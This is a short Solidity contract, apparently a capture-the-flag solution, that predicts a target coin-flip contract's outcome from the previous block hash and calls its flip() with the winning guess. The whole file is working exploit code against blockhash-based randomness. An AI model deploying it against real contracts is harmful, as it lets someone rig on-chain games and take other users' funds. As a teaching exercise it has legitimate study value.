// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlipContract {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipPredictor {
    address coinFlipInstance;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor (address _coinFlipInstance) {
        coinFlipInstance = _coinFlipInstance;
    }

    function setInstance(address _coinFlipInstance) public {
        coinFlipInstance = _coinFlipInstance;
    }

    function predictAndFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        CoinFlipContract(coinFlipInstance).flip(side);
    }
}